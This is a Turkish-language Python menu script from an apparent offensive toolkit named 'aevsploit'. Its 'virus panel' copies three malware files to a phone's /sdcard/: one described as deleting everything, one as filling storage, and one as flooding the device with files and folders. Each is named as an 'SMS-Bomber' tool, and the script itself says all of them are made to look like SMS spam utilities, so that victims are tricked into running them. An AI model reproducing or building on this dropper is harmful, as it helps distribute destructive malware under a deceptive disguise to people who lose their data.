import os
from aev import *

def banner():
  os.system("clear")
  menu.bnr("VIRUS")
  menu.p2("Herşeyi Silen Virüs","1")
  menu.p2("Depolama Dolduran Virüs","2")
  menu.p2("Bir Sürü Dosya & Klasör Oluşturucu Virüs","3")
  menu.p2("Tüm Kayıtlı Virüs Dosyalarını Sil","x")
  menu.p2("Bilgi","i")
  menu.p2("Çık","0")
  print()
  
dz = ".lib/virüs/"

while True:
  banner()
  aev = input(f"{r.k1}┌──[{r.y1}aevsploit • {r.c1}virüs.panel{r.k1}]\n│\n└─⊰ {r.p1}")
  if aev == "01" or aev == "1":
    a = "'SmS-Bomber • Virüs1.py'"
    so.c()
    so.dt(dz + a,"/sdcard/")
    menu.sd(a)
    menu.input()
  elif aev == "02" or aev == "2":
    a = "'SmS-Bomber • Virüs2.py'"
    so.c()
    so.dt(dz + a,"/sdcard/")
    menu.sd(a)
    menu.input()
  elif aev == "03" or aev == "3":
    a = "'SmS-Bomber • Virüs3.py'"
    so.c()
    so.dt(dz + a,"/sdcard/")
    menu.sd(a)
    menu.input()
  elif aev == "i":
    so.c()
    print(r.p1 + "Hepsi Sms Spam Görünümlüdür.\n")
    menu.input()
    banner()
  elif aev == "x":
    so.c()
    s = "/sdcard/"
    so.sl(s + "'SmS-Bomber • Virüs1.py'",s + "'SmS-Bomber • Virüs2.py'",s + "'SmS-Bomber • Virüs3.py'")
    print("Başarılı.")
    menu.input()
  elif aev == "0" or aev == "00":
    exit()
  else:
    menu.els()
    